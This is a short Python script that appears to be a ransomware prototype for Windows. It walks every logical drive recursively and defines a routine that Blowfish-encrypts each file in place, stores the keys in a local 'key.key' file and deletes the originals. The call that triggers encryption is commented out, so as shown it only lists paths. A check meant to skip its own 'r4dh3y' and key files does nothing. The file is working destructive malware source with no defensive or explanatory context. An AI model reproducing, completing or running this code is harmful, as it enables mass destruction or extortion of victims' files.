import blowfish
import win32api
from cryptography.fernet import Fernet
import os
from cryptography.exceptions import UnsupportedAlgorithm
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

def get_details(file):
	file = file.split('\\')
	length = len(file)
	filename = file[length-1]
	path = ''
	for i in range(length-1):
		path += file[i] + "\\"
	return [path, filename]

def encrypt(file):
	temp = file.split('.')
	if temp[len(temp)-1] == 'r4dh3y' or temp[len(temp)-1] == 'key':
		pass
	key = Fernet.generate_key()
	cipher = blowfish.Cipher(key)
	keyfile = open("key.key",'wb+')
	keyfile.write((file.encode() + "-->".encode() + key + "\n".encode()))
	keyfile.close()
	pfile = open(file,'rb')
	details = get_details(file)
	cfile = open((details[0]+details[1]+'.temp'),'wb')
	data = pfile.read(8)
	lst = []
	while data:
		bytes = len(data)
		if bytes < 8:
			data += b' '*(8-bytes)
		cfile.write(cipher.encrypt_block(data))
		data = pfile.read(8)
	cfile.close()
	pfile.close()
	os.remove((details[0]+details[1]))
	os.rename((details[0]+details[1]+'.temp'), (details[0]+details[1]))

def dir(path):
	try:
		lst = os.listdir(path)
		for i in range(len(lst)):
			lst[i] = path + "\\" + lst[i]
			dir(lst[i])
	except:
		print(path)
#		try:
#			encrypt(path)
#		except:
#			pass

def main():
	drives = win32api.GetLogicalDriveStrings()
	drives = drives.split('\000')[:-1]
	for drive in drives:
		dir(drive)

if __name__ == '__main__':
	main()